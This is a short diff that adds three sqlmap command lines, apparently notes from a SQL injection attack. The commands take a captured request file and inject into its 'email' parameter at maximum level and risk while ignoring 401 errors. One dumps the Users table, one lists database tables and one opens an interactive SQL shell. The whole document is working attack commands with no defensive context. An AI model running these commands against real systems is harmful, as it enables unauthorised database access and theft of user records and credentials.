@@ -1,0 +1,3 @@
+sqlmap -r ./Documents/log.txt --tables Users --dump -p email --level 5 --risk 3 --ignore-code 401
+sqlmap -r ./Documents/log.txt --tables -p email --level 5 --risk 3 --ignore-code 401
+sqlmap -r ./Documents/log.txt --sql-shell -p email --level 5 --risk 3 --ignore-code 401
